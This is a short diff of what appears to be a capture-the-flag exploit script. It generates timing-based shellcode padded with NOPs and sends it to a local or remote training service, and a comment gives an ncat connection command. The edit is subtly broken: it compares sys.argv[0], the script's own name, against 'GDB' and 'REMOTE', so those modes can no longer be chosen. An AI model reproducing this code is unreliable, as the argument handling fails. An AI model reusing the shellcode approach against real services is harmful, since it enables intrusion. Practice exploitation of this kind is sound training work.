@@ -59,12 +59,12 @@ def create_timing_shellcode(position, character):
     
     return shellcode.ljust(1024, b'\x90')
 
-shellcode = create_timing_shellcode(0, ord(sys.argv[2]))
+shellcode = create_timing_shellcode(0, ord(sys.argv[1]))
 
 #ncat --ssl back-to-shell.training.offensivedefensive.it 8080
-if sys.argv[1] == "GDB":
+if sys.argv[0] == "GDB":
     p = gdb.debug("./benchmarking_service", gdbscript=COMMANDS)
-elif sys.argv[1] == "REMOTE":
+elif sys.argv[0] == "REMOTE":
     p = remote("benchmarking-service.training.offensivedefensive.it", 8080, ssl=True)
 else:
     p = process("./benchmarking_service")
